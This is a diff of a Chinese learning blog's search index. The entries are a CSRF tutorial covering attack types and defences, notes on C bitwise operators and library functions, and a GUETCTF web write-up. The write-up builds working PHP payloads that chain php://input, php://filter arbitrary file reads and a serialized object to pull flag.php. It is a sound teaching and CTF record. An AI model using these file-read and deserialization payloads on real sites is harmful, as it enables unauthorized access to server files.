@@ -1,70 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CSRF漏洞学习</title>
-    <url>/2019/10/26/CSRF%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>[TOC]</p>
-<h1 id="CSRF学习"><a href="#CSRF学习" class="headerlink" title="CSRF学习"></a>CSRF学习</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
-<li>CSRF（Cross-site request forgery）跨站请求伪造，通过<font color="red">伪装成受信任用户</font>的请求来利用受信任的网站。</li>
-</ul>
-<a id="more"></a>
-
-<blockquote>
-<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p>
-</blockquote>
-<hr>
-<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-GET型"><a href="#1-GET型" class="headerlink" title="1.GET型"></a>1.GET型</h3><ul>
-<li>通过修改get请求的参数，来达到攻击的目的</li>
-</ul>
-<blockquote>
-<p>如：/user.php?id=1&amp;email=123@163.com，这个链接的意思是用户id=1将邮箱修改为<a href="mailto:123@163.com">123@163.com</a>。当我们把这个链接修改为 /user.php?id=1&amp;email=abc@163.com ，然后通过各种手段发送给被攻击者，诱使被攻击者点击我们的链接，==当用户刚好在访问这个网站==，他同时又点击了这个链接，那么这个用户的邮箱被修改为<a href="mailto:abc@163.com">abc@163.com</a></p>
-</blockquote>
-<h3 id="2-POST型"><a href="#2-POST型" class="headerlink" title="2.POST型"></a>2.POST型</h3><ul>
-<li>这类型的csrf利用起来通常是使用一个自动提交的表单</li>
-<li>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</li>
-</ul>
-<blockquote>
-<p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p>
-</blockquote>
-<hr>
-<h2 id="原理及过程"><a href="#原理及过程" class="headerlink" title="原理及过程"></a>原理及过程</h2><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A</p>
-<p>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A</p>
-<p>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B</p>
-<p>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A</p>
-<p>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下==携带Cookie信息==，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </p>
-<hr>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
-<li>验证HTTP Referer字段</li>
-</ol>
-<ul>
-<li>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。而如果黑客要对网站实施 CSRF 攻击，他只能在他自己的网站构造请求，该请求的 Referer 是指向黑客自己的网站。网站只需要对于每一个请求验证其 Referer 值如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。<blockquote>
-<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
-</blockquote>
-</li>
-</ul>
-<p>2.在请求地址中添加 token 并验证(Anti-CSRF token)</p>
-<ul>
-<li>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下<font color="green">直接利用用户自己的 cookie 来通过安全验证。</font></li>
-<li>要抵御 CSRF，关键在于在++请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中++。可以在 HTTP 请求中以参数的形式加入一个==随机产生的 token==，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 <blockquote>
-<p>token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。</p>
-</blockquote>
-</li>
-</ul>
-<p>3.在 HTTP 头中自定义属性并验证</p>
-<ul>
-<li>这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到HTTP头中自定义的属性里。通过==XMLHttpRequest==这个类，可以一次性给所有该类请求加上 CSRFToken 这个 HTTP 头属性，并把 token 值放入其中。</li>
-</ul>
-<hr>
-<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1：最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</p>
-<p>2：如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
-]]></content>
-      <tags>
-        <tag>WEB安全</tag>
-        <tag>CTF</tag>
-        <tag>漏洞挖掘</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Brainfuck&amp;Ook!加密</title>
     <url>/2019/10/26/Brainfuck&amp;Ook%E5%8A%A0%E5%AF%86/</url>
     <content><![CDATA[<p>[TOC]</p>
@@ -139,8 +75,72 @@ Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. </code></pre><p>密文形式二（不常
 ++.&lt;</code></pre><p><strong>这两种加密方式的解密网站是同一个：</strong><br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
 ]]></content>
       <tags>
-        <tag>CTF</tag>
         <tag>密码学</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSRF漏洞学习</title>
+    <url>/2019/10/26/CSRF%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<h1 id="CSRF学习"><a href="#CSRF学习" class="headerlink" title="CSRF学习"></a>CSRF学习</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
+<li>CSRF（Cross-site request forgery）跨站请求伪造，通过<font color="red">伪装成受信任用户</font>的请求来利用受信任的网站。</li>
+</ul>
+<a id="more"></a>
+
+<blockquote>
+<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p>
+</blockquote>
+<hr>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-GET型"><a href="#1-GET型" class="headerlink" title="1.GET型"></a>1.GET型</h3><ul>
+<li>通过修改get请求的参数，来达到攻击的目的</li>
+</ul>
+<blockquote>
+<p>如：/user.php?id=1&amp;email=123@163.com，这个链接的意思是用户id=1将邮箱修改为<a href="mailto:123@163.com">123@163.com</a>。当我们把这个链接修改为 /user.php?id=1&amp;email=abc@163.com ，然后通过各种手段发送给被攻击者，诱使被攻击者点击我们的链接，==当用户刚好在访问这个网站==，他同时又点击了这个链接，那么这个用户的邮箱被修改为<a href="mailto:abc@163.com">abc@163.com</a></p>
+</blockquote>
+<h3 id="2-POST型"><a href="#2-POST型" class="headerlink" title="2.POST型"></a>2.POST型</h3><ul>
+<li>这类型的csrf利用起来通常是使用一个自动提交的表单</li>
+<li>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</li>
+</ul>
+<blockquote>
+<p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p>
+</blockquote>
+<hr>
+<h2 id="原理及过程"><a href="#原理及过程" class="headerlink" title="原理及过程"></a>原理及过程</h2><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A</p>
+<p>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A</p>
+<p>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B</p>
+<p>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A</p>
+<p>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下==携带Cookie信息==，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </p>
+<hr>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>验证HTTP Referer字段</li>
+</ol>
+<ul>
+<li>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。而如果黑客要对网站实施 CSRF 攻击，他只能在他自己的网站构造请求，该请求的 Referer 是指向黑客自己的网站。网站只需要对于每一个请求验证其 Referer 值如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。<blockquote>
+<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
+</blockquote>
+</li>
+</ul>
+<p>2.在请求地址中添加 token 并验证(Anti-CSRF token)</p>
+<ul>
+<li>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下<font color="green">直接利用用户自己的 cookie 来通过安全验证。</font></li>
+<li>要抵御 CSRF，关键在于在++请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中++。可以在 HTTP 请求中以参数的形式加入一个==随机产生的 token==，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 <blockquote>
+<p>token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。</p>
+</blockquote>
+</li>
+</ul>
+<p>3.在 HTTP 头中自定义属性并验证</p>
+<ul>
+<li>这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到HTTP头中自定义的属性里。通过==XMLHttpRequest==这个类，可以一次性给所有该类请求加上 CSRFToken 这个 HTTP 头属性，并把 token 值放入其中。</li>
+</ul>
+<hr>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1：最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</p>
+<p>2：如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>WEB安全</tag>
+        <tag>漏洞挖掘</tag>
       </tags>
   </entry>
   <entry>
@@ -864,6 +864,750 @@ p <span class="token operator">=</span> <span class="token operator">&amp;</span
       </tags>
   </entry>
   <entry>
+    <title>C语言位运算符学习</title>
+    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
+    <content><![CDATA[<h1 id="C语言运算符"><a href="#C语言运算符" class="headerlink" title="C语言运算符"></a>C语言运算符</h1><p>[Toc]</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a><strong>概念</strong></h2><ul>
+<li>位运算是指按二进制进行的运算。</li>
+<li>C语言提供了6个位操作运算符。这些运算符只能用于整型操作数，即只能用于带符号或无符号的char,short,int与long类型。</li>
+</ul>
+<a id="more"></a>
+
+<p>======================================</p>
+<h2 id="C语言提供的位运算符列表"><a href="#C语言提供的位运算符列表" class="headerlink" title="C语言提供的位运算符列表"></a><strong>C语言提供的位运算符列表</strong></h2><table>
+<thead>
+<tr>
+<th>运算符</th>
+<th>含义</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;</td>
+<td>按位与</td>
+<td>如果两个相应的二进制位都为1，则该位的结果值为1，否则为0</td>
+</tr>
+<tr>
+<td>l</td>
+<td>按位或</td>
+<td>两个相应的二进制位中只要有一个为1，该位的结果值为1</td>
+</tr>
+<tr>
+<td>^</td>
+<td>按位异或</td>
+<td>若参加运算的两个二进制位值相同则为0，否则为1</td>
+</tr>
+<tr>
+<td>~</td>
+<td>取反</td>
+<td>~是一元运算符，用来对一个二进制数按位取反，即将0变1，将1变0</td>
+</tr>
+<tr>
+<td>&lt;&lt;</td>
+<td>左移</td>
+<td>用来将一个数的各二进制位全部左移N位，右补0</td>
+</tr>
+<tr>
+<td>&gt;&gt;</td>
+<td>右移</td>
+<td>将一个数的各二进制位右移N位，移到右端的低位被舍弃，对于无符号数，高位补0</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="按位与运算符"><a href="#按位与运算符" class="headerlink" title="按位与运算符"></a><strong>按位与运算符</strong></h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><ul>
+<li>按位与是指：参加运算的两个数据，按二进制位进行“与”运算。如果两个相应的二进制位都为１，则该位的结果值为1；否则为0。</li>
+<li>按位与其实与逻辑上“与”的运算规则一致。逻辑上的“与”，要求运算数全真，结果才为真。若，A=true,B=true,则A∩B=true </li>
+<li>例如：3&amp;5 3的二进制编码是11(2)。（为了区分十进制和其他进制，凡是非十进制的数据均在数据后面加上括号，括号中注明其进制，二进制则标记为2）内存储存数据的基本单位是字节（Byte），一个字节由8个位（bit)所组成。位是用以描述电脑数据量的最小单位。二进制系统中，每个0或1就是一个位。将11（2）补足成一个字节，则是00000011（2）。5的二进制编码是101（2），将其补足成一个字节，则是00000101（2）</li>
+</ul>
+<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>1）清零</p>
+<p>若想对一个存储单元清零，即使其全部二进制位为0，只要找一个二进制数</p>
+<blockquote>
+<p>原来的数中为1的位，新数中相应位为0。然后使二者进行&amp;运算，即可达到清零目的</p>
+</blockquote>
+<p>2）取一个数中某些指定位</p>
+<p>若有一个整数a(2byte),想要取其中的低字节，只需要将a与8个1按位与即可</p>
+<p>3）保留指定位：</p>
+<p>与一个数进行“按位与”运算，此数在该位取1.</p>
+<hr>
+<hr>
+<h2 id="按位或运算符"><a href="#按位或运算符" class="headerlink" title="按位或运算符"></a><strong>按位或运算符</strong></h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><ul>
+<li>两个相应的二进制位中只要有一个为1，该位的结果值为1。</li>
+</ul>
+<hr>
+<hr>
+<h2 id="异或运算符"><a href="#异或运算符" class="headerlink" title="异或运算符"></a><strong>异或运算符</strong></h2><ul>
+<li>1.使特定位翻转</li>
+<li>2.保留原值（与0相异或）</li>
+<li>3.交换两个值不用临时变量</li>
+</ul>
+<hr>
+<hr>
+<h2 id="取反运算符"><a href="#取反运算符" class="headerlink" title="取反运算符"></a><strong>取反运算符</strong></h2><ul>
+<li>用于求整数的二进制反码，即分别将操作数各二进制位上的1变为0，0变为1。</li>
+</ul>
+<hr>
+<hr>
+<h2 id="左移运算符"><a href="#左移运算符" class="headerlink" title="左移运算符"></a><strong>左移运算符</strong></h2><ul>
+<li>左移运算符是用来将一个数的各二进制位左移若干位，移动的位数由右操作数指定（右操作数必须是非负值），其右边空出的位用0填补，高位左移溢出则舍弃该高位。</li>
+</ul>
+<hr>
+<hr>
+<h2 id="右移运算符"><a href="#右移运算符" class="headerlink" title="右移运算符"></a><strong>右移运算符</strong></h2><ul>
+<li>右移运算符是用来将一个数的各二进制位右移若干位，移动的位数由右操作数指定（右操作数必须是非负<br>值），移到右端的低位被舍弃，</li>
+<li>对于无符号数，高位补0。</li>
+<li>对于有符号数，某些机器将对左边空出的部分<br>用符号位填补（即“算术移位”），而另一些机器则对左边空出的部分用0填补（即“逻辑移位”）。</li>
+<li>注意：对无符号数,右移时左边高位移入0；对于有符号的值,如果原来符号位为0(该数为正),则左边也是移入0。如果符号位原来为1(即负数),则左边移入0还是1,要取决于所用的计算机系统。有的系统移入0,有的系统移入1。移入0的称为“逻辑移位”,即简单移位；移入1的称为“算术移位”。</li>
+</ul>
+<hr>
+<hr>
+<h2 id="位运算赋值运算符"><a href="#位运算赋值运算符" class="headerlink" title="位运算赋值运算符"></a><strong>位运算赋值运算符</strong></h2><ul>
+<li>位运算符与赋值运算符可以组成复合赋值运算符。</li>
+</ul>
+<blockquote>
+<p>例如: &amp;=, |=, &gt;&gt;=, &lt;&lt;=, ∧=</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>编程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GUETCTF-WEB3-writeup</title>
+    <url>/2019/10/26/GUETCTF_web3_wp/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<h2 id="GUETCTF-web3-wp"><a href="#GUETCTF-web3-wp" class="headerlink" title="GUETCTF-web3-wp"></a>GUETCTF-web3-wp</h2><p>打开网页是一个登陆界面，f12查看源码：</p>
+<a id="more"></a>
+
+<pre><code>&lt;!--  
+$user = $_GET[&quot;username&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;pass&quot;];  
+
+if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;i-am-admin&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+ --&gt;  </code></pre><hr>
+<ol>
+<li>一开始直接让<strong>username=i-am-admin</strong>但登陆失败</li>
+</ol>
+<p>发现思路是<font color="green">让file_get_content($user,’r’)===”i-am-admin”，所以要用伪协议php://input传入参数</font>。</p>
+<blockquote>
+<p>php：//input可以得到原始的post数据</p>
+</blockquote>
+<hr>
+<ol start="2">
+<li>接下来要想办法<strong>包含hint.php</strong></li>
+</ol>
+<ul>
+<li>这里用到php的另一个封装协议：php://filter<br>利用这个协议就可以读取任意文件<br><font color="green">利用方法：php://filter/convert.base64-encode/resource=hint.php</font></li>
+</ul>
+<p>这里把读取到的hint.php的内容转换为base64的格式，<br>于是构造payload:</p>
+<pre><code>?user=php://input&amp;file=php://filter/convert.base64-encode/resource=hint.php</code></pre><p>在线解码后得到hint.php</p>
+<pre><code>&lt;?php  
+error_reporting(0);
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;This is your flag!&quot;);
+        }  
+    }  
+}  
+?&gt;  </code></pre><hr>
+<p>但我们不能直接访问flag.php，因为</p>
+<pre><code>if(preg_match(&quot;/flag/&quot;,$file)){
+        exit();</code></pre><p>回到源码发现需要用<strong>反序列化</strong>读取flag.php文件<br>于是根据hint.php构造</p>
+<pre><code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}</code></pre><p>得到一串base64直接解码就能得到flag</p>
+<hr>
+<p>总的payload是:</p>
+<pre><code>?user=php://input&amp;file=hint.php&amp;pass=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}</code></pre><p>(同时post参数i-am-admin)</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C语言库函数学习</title>
+    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E5%BA%93%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="C语言库函数"><a href="#C语言库函数" class="headerlink" title="C语言库函数"></a>C语言库函数</h1><p>[Toc]</p>
+<h2 id="1-数学函数"><a href="#1-数学函数" class="headerlink" title="1.数学函数"></a><strong>1.数学函数</strong></h2><ul>
+<li>使用数学函数时，应在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;math.h></span> </span></code></pre>
+</li>
+</ul>
+<a id="more"></a>
+
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>函数原型</th>
+<th>功能</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>acos</td>
+<td>double acos(double x)</td>
+<td>计算arccos x的值，其中-1&lt;=x&lt;=1</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>asin</td>
+<td>double asin(double x)</td>
+<td>计算arcsin x的值，其中-1&lt;=x&lt;=1</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>atan</td>
+<td>double atan(double x)</td>
+<td>计算arctan x的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>atan2</td>
+<td>double atan2(double x,double y)</td>
+<td>计算arctan x/y的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>cos</td>
+<td>double cos(double x)</td>
+<td>计算cos x的值,其中x的单位为弧度</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>cosh</td>
+<td>double cosh(double x)</td>
+<td>计算x的双曲余弦cosh x的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>exp</td>
+<td>double exp(double x)</td>
+<td>求e^x的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>fabs</td>
+<td>double fabs(double x)</td>
+<td>求x的绝对值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>floor</td>
+<td>double floor(double x)</td>
+<td>求出不大于x的最大整数</td>
+<td>该整数的双精度实数</td>
+</tr>
+<tr>
+<td>fmod</td>
+<td>double fmod(double x,double y);</td>
+<td>求整除x/y的余数</td>
+<td>返回余数的双精度实数</td>
+</tr>
+<tr>
+<td>frexp</td>
+<td>double frexp(double val,int *eptr)</td>
+<td>把双精度数val分解成数字部分(尾数)和以2为底的指数，即val=x * 2^n,n存放在eptr指向的变量中</td>
+<td>数字部分x 0.5 &lt;= x &lt; 1</td>
+</tr>
+<tr>
+<td>log</td>
+<td>double log(double x)</td>
+<td>求ln x的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>log10</td>
+<td>double log10(double x)</td>
+<td>求log10x的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>modf</td>
+<td>double mof(double val,int * iptr)</td>
+<td>把双精度数val分解成数字部分和小数部分，把整数部分存放在ptr指向的变量中</td>
+<td>val的小数部分</td>
+</tr>
+<tr>
+<td>pow</td>
+<td>double pow(double x,double y)</td>
+<td>求x^y的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>sin</td>
+<td>double sin(double x)</td>
+<td>求sin x的值,其中x的单位为弧度</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>sinh</td>
+<td>double sinh(double x)</td>
+<td>计算x的双曲正弦函数sinh x的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>sqrt</td>
+<td>double sqrt(double x)</td>
+<td>计算，其中x&gt;=0</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>tan</td>
+<td>double tan(double x)</td>
+<td>计算tan x的值,其中x的单位为弧度</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>tanh</td>
+<td>double tanh(double x)</td>
+<td>计算tanh x的值，其中x的单位为弧度</td>
+<td>计算结果</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="2-字符函数"><a href="#2-字符函数" class="headerlink" title="2.字符函数"></a><strong>2.字符函数</strong></h2><ul>
+<li>在使用字符函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span></code></pre>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>函数原型</th>
+<th>功能</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>isalnum</td>
+<td>int isalnum(int ch)</td>
+<td>检查ch是否字母或数字</td>
+<td>是则返回1，否则返回0</td>
+</tr>
+<tr>
+<td>isalpha</td>
+<td>int isalpha(int ch)</td>
+<td>检查ch是否为字母</td>
+<td>是字母返回1，否则返回0</td>
+</tr>
+<tr>
+<td>iscntrl</td>
+<td>int iscntrl(int ch)</td>
+<td>检查ch是否控制字符（其ASCII码在0和0xLF之间)</td>
+<td>是控制字符返回1，否则返回0</td>
+</tr>
+<tr>
+<td>isdigit</td>
+<td>int isdigit(int ch)</td>
+<td>检查ch是否为数字</td>
+<td>是数字返回1，否则返回0</td>
+</tr>
+<tr>
+<td>isgraph</td>
+<td>int isgraph(int ch)</td>
+<td>检查ch是否可打印字符（其ASCII码在0x21和0x7e之间），不包括空格</td>
+<td>可打印字符返回1，否则返回0</td>
+</tr>
+<tr>
+<td>islower</td>
+<td>int islower(int ch)</td>
+<td>检查ch是否是小写字母(a~z)</td>
+<td>是小写字母返回1，否则返回0</td>
+</tr>
+<tr>
+<td>isprint</td>
+<td>int print(int ch)</td>
+<td>检查ch是否是可打印字符（其ASCII码在0x21和0x7e之间),不包括空格</td>
+<td>可打印字符返回1，否则返回0</td>
+</tr>
+<tr>
+<td>ispunct</td>
+<td>int ispunct(int ch)</td>
+<td>检查ch是否是标点字符（不包括空格）即除字母、数字和空格以外的所有可打印字符</td>
+<td>是标点返回1，否则返回0</td>
+</tr>
+<tr>
+<td>isspace</td>
+<td>int isspace(int ch)</td>
+<td>检查ch是否空格、制表符或换行符</td>
+<td>是返回1，否则返回0</td>
+</tr>
+<tr>
+<td>isupper</td>
+<td>int isupper(int ch)</td>
+<td>检查ch是否大写字母(A~Z)</td>
+<td>是返回1，否则返回0</td>
+</tr>
+<tr>
+<td>isxdigit</td>
+<td>int isxdigit(int ch)</td>
+<td>检查ch是否一个16进制数字(即0<del>9，或A</del>F,a~f)</td>
+<td>是返回1，否则返回0</td>
+</tr>
+<tr>
+<td>tolower</td>
+<td>int tolower(int ch)</td>
+<td>将ch字符转换为小写字母</td>
+<td>返回ch对应的小写字母</td>
+</tr>
+<tr>
+<td>toupper</td>
+<td>int toupper(int ch)</td>
+<td>将ch字符转换为大写字母</td>
+<td>返回ch对应的大写字母</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<hr>
+<h2 id="3-字符串函数"><a href="#3-字符串函数" class="headerlink" title="3.字符串函数"></a><strong>3.字符串函数</strong></h2><ul>
+<li>在使用字符串函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></code></pre>
+<img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538569387148&di=fa4604d28b80f7d5b8031101d952c7c7&imgtype=0&src=http%3A%2F%2Fwww.68idc.cn%2Fhelp%2Fuploads%2Fallimg%2F150116%2F151FMW7_0.jpg" alt></li>
+</ul>
+<hr>
+<h2 id="4-输入输出函数"><a href="#4-输入输出函数" class="headerlink" title="4.输入输出函数"></a><strong>4.输入输出函数</strong></h2><ul>
+<li>在使用输入输出函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></code></pre>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>函数原型</th>
+<th>功能</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>clearerr</td>
+<td>void clearerr(FILE *fp)</td>
+<td>清除文件指针错误提示器</td>
+<td>无</td>
+</tr>
+<tr>
+<td>close</td>
+<td>int close(int fp)</td>
+<td>关闭文件（非ANSI标准)</td>
+<td>关闭成功返回0，不成功返回-1</td>
+</tr>
+<tr>
+<td>creat</td>
+<td>int creat(char*filename,int mode)</td>
+<td>以mode所指定的方式建立文件（非ANSI标准）</td>
+<td>成功返回正数，否则返回-1</td>
+</tr>
+<tr>
+<td>eof</td>
+<td>int eof（int fp)</td>
+<td>判断fp所指的文件是否结束</td>
+<td>文件结束返回1，否则返回0</td>
+</tr>
+<tr>
+<td>fclose</td>
+<td>int fclose（FILE * fp)</td>
+<td>关闭fp所指的文件，释放文件缓冲区</td>
+<td>关闭成功返回0，不成功返回非0</td>
+</tr>
+<tr>
+<td>feof</td>
+<td>int feof(FILE * fp)</td>
+<td>检查文件是否结束</td>
+<td>结束返回非0，否则返回0</td>
+</tr>
+<tr>
+<td>ferror</td>
+<td>int ferror(FILE * fp)</td>
+<td>测试fp所指文件是否错误</td>
+<td>无错返回0，否则返沪非0</td>
+</tr>
+<tr>
+<td>fflush</td>
+<td>int fflush(FILE * fp)</td>
+<td>将fp所指的文件的全部控制信息和数据存盘</td>
+<td>存盘正确返回0，否则返回非0</td>
+</tr>
+<tr>
+<td>fgets</td>
+<td>char *fgets(char *buf,int n,FILE *fp)</td>
+<td>从fp所指的文件读取一个长度为(n-1)的字符串，存入起始地址为buf的空间</td>
+<td>返回地址buf。若遇文件结束或出错则返回E0F</td>
+</tr>
+<tr>
+<td>fopen</td>
+<td>FILE *fopen(char *filename, char *mode)</td>
+<td>以mode指定的方式打开名为filename的文件</td>
+<td>成功，则返回一个文件指针，否则返回0</td>
+</tr>
+<tr>
+<td>fprintf</td>
+<td>int fprintf(FILE * fp, char *format,args,…)</td>
+<td>把args的值以format指定的格式输出到fp所指的文件中</td>
